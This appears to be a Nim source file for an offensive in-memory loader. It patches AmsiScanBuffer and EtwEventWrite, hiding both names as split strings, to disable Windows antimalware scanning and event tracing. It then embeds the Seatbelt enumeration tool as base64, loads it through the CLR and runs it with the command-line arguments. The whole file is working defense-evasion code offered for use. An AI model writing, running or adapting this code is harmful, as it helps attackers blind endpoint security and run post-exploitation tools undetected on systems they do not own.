import os, winim/clr, sugar, strformat, base64, dynlib

proc patchE(): bool =
    const patch: array[1, byte] = [byte 0xc3]
    var
        xxx: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    xxx = loadLib("ntdll")
    if isNil(xxx):
        return disabled

    let
        a = "EtwE"
        b = "ventW"
        c = "rite"

    cs = xxx.symAddr(cstring(a & b & c))
    if isNil(cs):
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled

proc patchA(): bool =
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    var
        xxx: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    let
        a = "Ams"
        b = "i"
        c = "ScanB"
        d = "uffer"
        
    xxx = loadLib(a & b)
    if isNil(xxx):
        return disabled

    
    cs = xxx.symAddr(cstring(a & b & c & d))
    if isNil(cs):
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled

func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

when isMainModule:
    let x = patchA()
    echo fmt"[+] 4MS1 disabled: {bool(x)}"
    let y = patchE()
    echo fmt"[+] 3TW disabled: {bool(y)}"

    const b64 = slurp"Seatbelt.exe".encode()
    
    echo "[+] Installed .NET versions"
    for v in clrVersions():
        echo fmt"    [>] {v}"

    let 
        buf = toByteSeq(decode(b64))
        assembly = load(buf)
    dump assembly

    var
        cmd: seq[string]
        i = 1
    
    while i <= paramCount():
        cmd.add(paramStr(i))
        inc(i)
    echo cmd
    let arr = toCLRVariant(cmd, VT_BSTR)
    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
